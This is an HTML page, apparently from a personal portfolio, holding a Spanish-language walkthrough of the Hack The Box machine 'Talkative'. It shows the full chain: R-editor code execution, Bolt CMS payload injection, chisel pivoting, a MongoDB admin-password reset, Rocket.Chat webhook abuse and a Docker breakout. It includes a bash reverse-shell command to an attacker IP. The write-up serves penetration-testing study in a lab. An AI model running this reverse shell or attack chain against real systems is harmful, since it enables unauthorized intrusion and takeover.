@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>Summary Machine Talkative</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="assets/img/ico.ico" rel="icon">
+  <link href="assets/img/ico.ico" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Satisfy" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="assets/css/style.css" rel="stylesheet">
+
+</head>
+
+<body>
+
+  <!-- ======= Header ======= -->
+  <header id="header" class="fixed-top d-flex justify-content-center align-items-center ">
+    <nav id="navbar" class="navbar">
+      <ul>
+        <li><a class="nav-link scrollto active" href="index.html">Home</a></li>
+      </ul>
+      <i class="bi bi-list mobile-nav-toggle"></i>
+    </nav><!-- .navbar -->
+  </header><!-- End Header -->
+
+  <main id="main">
+
+    <!-- ======= Breadcrumbs Section ======= -->
+    <section class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>Summary Machine Talkative</h2>
+          <ol>
+            <li><a href="index.html">Home</a></li>
+            <li>Summary Machine Talkative</li>
+          </ol>
+        </div>
+
+      </div>
+    </section><!-- Breadcrumbs Section -->
+
+    <!-- ======= Portfolio Details Section ======= -->
+    <section id="portfolio-details" class="portfolio-details">
+      <div class="container">
+
+        <div class="row gy-4">
+
+          <div class="col-lg-8">
+            <div class="portfolio-details-slider swiper">
+
+              <div class="swiper-slide">
+                <p>
+                Empezamos tramitando una petición icmp o ping para verificar si tenemos conexión con la máquina.
+                <center><p style="background-color: #9b9b9b ;">$ ping 10.10.11.155</p>	</center>
+                Ahora utilizando nmap empezare con algunos escaneos.
+                <br> <br> El primer escaneo que utilizaré va ser el siguiente:
+                <img src="Talkative/Nmap1.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+
+                  <p>
+                  <br>Luego de saber los puertos que están abiertos, verificamos la version y el servicio que están <br>corriendo en cada puerto:
+                  <br><img src="Talkative/Nmap2.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus" >
+                  <br><img src="Talkative/Nmap3.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus" >
+                  </p>
+                
+                  <p>
+                    <br>A primera vista, vemos un apache, cuando visitamos la página nos redirige hacia un dominio llamado<br>
+                    “talkative.htb”, pero de normal la pc no sabe a qué hace referencia ese nombre, así que vamos a <br>
+                    nuestro archivo “/etc/hosts” y agregamos la direccion IP y el nombre al que hace referencia<br>
+                    para que lo reconozca.
+                    <center><p style="background-color: #9b9b9b ;">$ /etc/hosts <br> 10.10.11.155    talkative.htb</p>	</center>
+                  </p>
+
+                  <p>
+                    <br>Ahora si cuando ponemos la direccion ip en el navegador, nos redirige a la página y nos carga sin problema.
+                    <br><img src="Talkative/pagina-inicio.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>
+                    <br>Lo segundo que veo en el escaneo nmap que realizamos anteriormente es un puerto 3000 abierto que nos redirige hacia otra página.
+                    <br><img src="Talkative/pagina-inicio2.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>
+                    <br>También tenemos un puerto 8080 abierto el cual nos redirige al siguiente.
+                    <br><img src="Talkative/pagina-inicio3.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus" >
+                  </p>
+
+                  <p>
+                    <br>En esta última página, vemos un mensaje el cual nos dice que esa version es vulnerable que es necesario actualizar.<br>
+                    <br>Bueno en este apartado de tipo hoja de cálculo, filas, celdas… <br> <br>
+                    Me llamo la atención esa simbolo de R (Lenguaje de programación), así que al darle nos abre un editor, el cual nos permite
+                    ejecutar comando, como no sabía cuál era la sintaxis de este lenguaje, investigué un poco y llegué a esto.
+                    
+                    <br><img src="Talkative/RCE R.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>
+                    <br>El cual nos permite ejecutar comandos dentro de la máquina. <br> <br>
+                    Me puse en escucha en el puerto 2020                    
+                    <center><p style="background-color: #9b9b9b ;">$ nc -nlvp 2020</p>	</center>
+                  </p>
+
+                  <p>
+                    E intente enviarme una reverse shell a mi maquina atacante.
+                    <center><p style="background-color: #9b9b9b ;">$ system("bash -c 'bash -i >& /dev/tcp/10.10.14.63/2020 0>&1'")</p>	</center>
+                  </p>
+
+                  <p>
+                    <br>Al revisar, me pude dar cuenta que no es la maquina victima, mas bien es un contenedor, dentro del contenedor, no 
+                    hay mucho que buscar, pero dentro del directorio /root, tenemos un archivo comprimido.                    
+                    <br><img src="Talkative/contenedor1-1.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>
+                    <br>El cual me pase a mi máquina para descomprimirlo y examinarlo.                    
+                    <br><img src="Talkative/contenedor1-2.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Dentro del archivo .zip que descomprimí y encontré lo siguiente
+                    <br>                    
+                    <br><img src="Talkative/contenedor1-3.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Explorando los archivos, encontré algunos nombres de usuarios en “xdata.json”
+                    <br>
+                    El archivo se veía de la siguiente manera:                         
+                    <br><img src="Talkative/contenedor1-4.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Como es un archivo .json, para poder verlo mejor use un "| jq" para reorganizarlo.                   
+                    <br><img src="Talkative/contenedor1-5.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p> Ya que está un poco más ordenado <br>
+                    Podemos filtrar por talative.htb                                       
+                    <br><img src="Talkative/contenedor1-6.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Para quitar las comas:                                                   
+                    <br><img src="Talkative/contenedor1-7.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Para quitar las comillas y quilar algunos nombres repetidos, podemos aplicar el siguiente filtro.
+                    <br> 
+                    Ahí tengo unos usuarios, solo tenemos que encontrar una manera de verificar si son válidos                  
+                    <br><img src="Talkative/contenedor1-8.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Pero además de eso habíamos visto algunas contraseñas:                                                   
+                    <br><img src="Talkative/contenedor1-9.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>
+                    Entonces, anteriormente cuando pasamos el archivo comprimido, el nombre del archivo, era:
+                    <center><p style="background-color: #9b9b9b ;">$ bolt-administration.omv</p>	</center>
+                  </p>
+
+                  <p>Básicamente bolt, se está utilizando en la página actual, investigando un poco quise ver si había alguna página de registro por defecto.                                                 
+                    <br><img src="Talkative/pagina-inicio4.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Así que, probando credenciales obtenidas, logré ingresar. <br> <br>
+                    Ya dentro, esto funciona de la misma manera que otros gestores de contenido, editamos una plantilla, agregamos un payload y nos ponemos 
+                    en escucha mediante un puerto e ingresamos a otro contenedor.                                                                   
+                    <br><img src="Talkative/contenedor2-1.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Como podemos ver, estamos en otro contenedor.
+                    Estando en este contenedor, veo que hay varios contenedores desde la misma máquina, como las direcciones ip básicamente son las mismas, quise probar a ver que puertos estarían abiertos desde la 172.17.0.1, monté un pequeño script.                                                                  
+                    <br><img src="Talkative/contenedor2-2.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>El resultado fue el siguiente:                                             
+                    <br><img src="Talkative/contenedor2-3.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Veo que el puerto ssh está abierto y en la maquina en la que estoy actualmente está instalado, ya que en el anterior contenedor no tenía capacidad de nada. <br> <br>
+                    Ya que tenemos nombres de usuarios y contraseñas extraídas anteriormente, podemos probar para ver si nos podemos conectar.                                             
+                    <br><img src="Talkative/contenedor 3-1.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>                                               
+                    Donde podemos ver la user.txt <br> <br>
+                    Ahora tenemos que escalar privilegios
+                  </p>
+
+                  <p>Luego de revisar la maquina, quise utilizar “pspy”, pspy es una herramienta que nos permite obtener informacion de procesos sin tener privilegios root en el sistema.                                               
+                    <br><img src="Talkative/pspy.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Con pspy pude ver que está disponible el servicio mongodb, el cual está en otro contenedor, pero es posible conectarme a la base de datos utilizando un 
+                    programa llamado chisel, solo hay que descargar el servicio de mongosh en nuestra maquina atacante y descargar chisel y hacerlo de la siguiente manera. <br> <br>
+                    Desde nuestra maquina atacante abrimos el servidor chisel                                                                   
+                    <br><img src="Talkative/chisel.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Pasamos el chisel a la maquina víctima, lo ejecutamos de la siguiente manera con el puerto seleccionado.                                              
+                    <br><img src="Talkative/chisel2.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Luego de estar activo, solo abrimos el mongosh en nuestra maquina y se nos va a conectar automáticamente a la maquina víctima, al contenedor especificamente                                              
+                    <br><img src="Talkative/mognosh.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Dentro de una de las bases de datos, tenemos una tabla de users y dentro, si vemos el contenido de la tabla podemos ver un usuario que supuestamente es 
+                    administrador, y una contraseña encriptada, para el apartado de rocket chat que vimos anteriormente en el puerto 3000, bueno podemos intentar cambiar la 
+                    contraseña en la base de datos mediante un comando <br> <br>
+
+                    Básicamente cambiamos la contraseña a 12345, con el nombre de usuario admin. <br> <br>
+
+                    Y ya tenemos acceso
+                                                                   
+                    <br><img src="Talkative/acceso1.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Dentro del apartado Administración, podemos ver muchas opciones.                                              
+                    <br><img src="Talkative/acceso2.png" class="img-fluidportfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Como por ejemplo la version.                                              
+                    <br><img src="Talkative/acceso3.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Si buscamos en Google, rocket chat con la version a ver si hay algun Exploit, por ejemplo. <br> <br>
+                    Pude encontrar lo siguiente
+                                                                   
+                    <br><img src="Talkative/cve.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>El cual nos dice que, siendo administradores en el apartado de integraciones, podemos ejecutar un comando.                                               
+                    <br><img src="Talkative/acceso4.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Cuando lo guardamos, si volvemos al apartado de integraciones, nos da una direccion URL la cual, si nos ponemos en escucha y la ponemos en el navegador, pasa lo siguiente.                                               
+                    <br><img src="Talkative/nc2.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Estamos como root, ahora podríamos implementar un docket breakout para elevar los privilegios y salir del Docker. <br> <br>
+                    Descargamos un programa llamado cdk en github. <br> <br>
+                    Lo pasamos a la maquina víctima, ya que la maquina no tiene wget, o curl o alguna forma de transferir el archivo, podemos usar la siguiente forma.
+                                                                   
+                    <br><img src="Talkative/nc cdk.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Como vemos ya pasamos el archivo:                                              
+                    <br><img src="Talkative/file cdk.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Lo ejecutamos con el parametro “evaluate” y nos muestra lo siguiente.                                               
+                    <br><img src="Talkative/ckd exec.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                  <p>Nos dice que podemos leer archivos de la maquina host con el comando que nos muestra                                               
+                    <br><img src="Talkative/final.png" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+                  </p>
+
+                </p>
+              </div>
+
+            </div>
+          </div>
+
+          <div class="col-lg-4">
+            <div class="portfolio-info">
+              <center><h3 style="color: #FF0000;">Information</h3></center>
+              <ul>
+                <li><strong>#Pentesting #Cybersecurity #RedTeam</strong></li>
+                <li><strong>Machine</strong>: Talkative</li>
+                <li><strong>Difficulty</strong>: Hard</li>
+                <li><strong>Plataforma</strong>: HACKTHEBOX</li>
+                <li><strong>Sistema Operativo</strong>: Parrot</li>
+                <li><strong>Skills</strong>: Jamovi Enumeration Rj Editor Code Execution (Reverse Shell) Information Leakage Bolt - Access to the administration panel Bolt - 
+                  PHP File Manipulation (Injecting Malicious Code) [RCE] PIVOTING Detecting tasks running on the system - PSPY Remote Port Forwarding - Chisel MongoDB - 
+                  Changing the admin user password Abusing Rocket.Chat - Creating a new malicious webhook File Upload Tip - Playing with PwnCat-CS Docker Breakout - CDK Utility</li>
+              </ul>
+              <img src="Talkative/Talkative.png" width="500" height="500" class="img-fluid portfolio-lightbox preview-link bx bx-plus">
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+    </section><!-- End Portfolio Details Section -->
+
+  </main><!-- End #main -->
+
+    <!-- ======= Footer ======= -->
+    <footer id="footer">
+      <div class="container">
+        <h3>Freddy Alfonseca Santos</h3>
+        <p>Tecnologo en Ciberseguridad, Pentester Jr.</p>
+        <div class="social-links">
+          <a href="https://www.youtube.com/channel/UC2bGk5ThBtWzzfCefGSpaGQ" class="twitter"><i class="bx bi-youtube"></i></a>
+          <a href="https://github.com/SlowSky0" class="facebook"><i class="bx bi-github"></i></a>
+          <a href="https://www.instagram.com/freddywithf/" class="instagram"><i class="bx bxl-instagram"></i></a>
+          <a href="https://www.linkedin.com/in/freddy-alfonseca-santos-5813971b2/" class="linkedin"><i class="bx bxl-linkedin"></i></a>
+        </div>
+      </div>
+    </footer><!-- End Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="assets/vendor/purecounter/purecounter.js"></script>
+  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="assets/vendor/waypoints/noframework.waypoints.js"></script>
+  <script src="assets/vendor/php-email-form/validate.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="assets/js/main.js"></script>
+
+</body>
+
+</html>
